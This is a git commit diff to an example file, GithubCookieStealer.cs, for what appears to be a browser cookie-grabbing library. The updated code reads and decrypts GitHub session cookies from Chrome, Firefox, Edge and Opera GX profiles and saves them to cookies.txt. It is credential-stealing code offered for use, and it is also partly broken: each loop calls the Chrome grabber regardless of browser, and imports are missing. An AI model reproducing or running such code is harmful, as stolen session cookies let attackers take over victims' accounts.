f5c62ece0b72546a71a2a9bf5313ea33488603e0
Official_Backdoor <61780641+TheBackdoor@users.noreply.github.com>
2020-12-23 00:01:18 +0100

    Update GithubCookieStealer.cs

--- Examples/GithubCookieStealer.cs
+++ Examples/GithubCookieStealer.cs
@@ -1,40 +1,46 @@
 using CockyGrabber;
 using System;
-namespace grabber
+namespace GrabberExamples
 {
     class Program
     {
         static void Main(string[] args)
         {
+            StringBuilder githubCookies = new StringBuilder();
+            
             ChromeGrabber cg = new ChromeGrabber(); FirefoxGrabber fg = new FirefoxGrabber(); EdgeGrabber eg = new EdgeGrabber(); OperaGxGrabber og = new OperaGxGrabber();
             if (cg.CookiesExists())
             {
                 foreach (var item in cg.GetCookiesByHostname(".github.com", cg.GetKey()))
                 {
-                    Console.WriteLine(item.Value + "\n");
+                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (fg.CookiesExists())
             {
                 foreach (var item in cg.GetCookiesByHostname(".github.com", fg.GetKey()))
                 {
-                    Console.WriteLine(item.Value + "\n");
+                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (eg.CookiesExists())
             {
                 foreach (var item in cg.GetCookiesByHostname(".github.com", eg.GetKey()))
                 {
-                    Console.WriteLine(item.Value + "\n");
+                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
             if (og.CookiesExists())
             {
                 foreach (var item in cg.GetCookiesByHostname(".github.com", og.GetKey()))
                 {
-                    Console.WriteLine(item.Value + "\n");
+                    githubCookies.AppendLine(item.HostName + " = " + item.Name + ":" + item.Value);
                 }
             }
+            
+            
+            File.WriteAllText("cookies.txt", githubCookies.ToString());
+            Console.WriteLine("Cookies Grabbed and saved Successfully!");
             Console.ReadKey();
         }
     }
